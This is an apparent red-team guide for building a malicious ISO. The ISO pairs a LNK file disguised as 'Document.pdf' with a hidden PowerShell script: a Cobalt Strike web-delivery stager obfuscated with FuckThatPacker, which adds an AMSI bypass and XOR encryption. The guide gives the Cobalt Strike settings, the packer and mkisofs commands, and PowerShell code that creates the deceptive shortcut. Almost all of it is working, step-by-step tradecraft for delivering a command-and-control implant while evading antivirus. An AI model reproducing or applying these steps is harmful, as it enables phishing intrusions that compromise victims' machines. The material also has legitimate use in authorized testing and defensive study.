# Packer.iso
## Description
ISO containing a LNK file and a hidden PS1. The LNK is ofuscated to use a Chrome icon and named Document.pdf.lnk (if 'show hidden files' is turned off, uses will only see Document.pdf.) LNK runs Powershell to execute the PS1 script. The PS1 script is CobaltStrike's scripted web delivery PowerShell URI (hosted.) It is obfuscated using F*ckThatPacker.
## Steps
### On Kali
Use CobaltStrike: Attacks > Web Drive-By > Scripted Web Delivery(S)
	URI is arbitrary (/CISA.ps1, /DefenderDefinitions.ps1, etc.)
	Localhost is 127.0.0.1 when hosting over CloudFront
	Local Port is 443 for HTTPS
	Listener is (usually) HTTPS
	Type is powershell
	x64 is checked
	SSL is checked
Once generated, save the powershell command that CobaltStrike outputs to a file (i.e /share/Working/name/webdriveby.txt).

Download F*ckThatPacker
	`git clone https://github.com/Unknow101/FuckThatPacker`
Use F*ckThatPacker to obfuscate the command (adds AMSI bypass and XOR encryption.)
	`python2.7 FuckThatPacker.py -k 32 -p /share/Working/name/webdriveby.txt`
Output will display on the console. Copy and save the output to a file (i.e. /share/Working/name/FTP/FTP.ps1). #Important to save this in it's own directory

### On Windows
Open PowerShell ISE and input:
```
$path                      = "$([Environment]::GetFolderPath('Desktop'))\Document.pdf.lnk"
$wshell                    = New-Object -ComObject Wscript.Shell
$shortcut                  = $wshell.CreateShortcut($path)

$shortcut.IconLocation     = "C:\Windows\System32\shell32.dll,70"
$shortcut.TargetPath       = "powershell.exe"
$shortcut.WorkingDirectory = ""
$shortcut.Description      = "Nope, not malicious"

$shortcut.WindowStyle      = 7
                           # 7 = Minimized window
                           # 3 = Maximized window
                           # 1 = Normal    window
$shortcut.Save()
```
- $path: what the file will be named
- $shortcut.IconLocation: if you're confident that the target will have that resource on their system, can set icon file
- $shortcut.TargetPath: command to execute

Run this script and a Document.pdf.lnk file should be generated to the Desktop.
Right click on Document.pdf.lnk and select Properties
In Target after powershell add "-Command .\FTP.ps1" (...\powershell.exe -Command .\FTP.ps1).
Move this file to be colocated with FTP.ps1 (/share/Working/name/FTP/Document.pdf.lnk)

### On Kali
Run the following to create an ISO containing the files:
`mkisofs -o /share/Working/name/packer.iso -J -r -V "packer" -hidden /share/Working/name/FTP/FTP.ps1 -graft-points "/=/share/Working/name/FTP"`

This should generate an iso containing the LNK and PS1 file (hidden)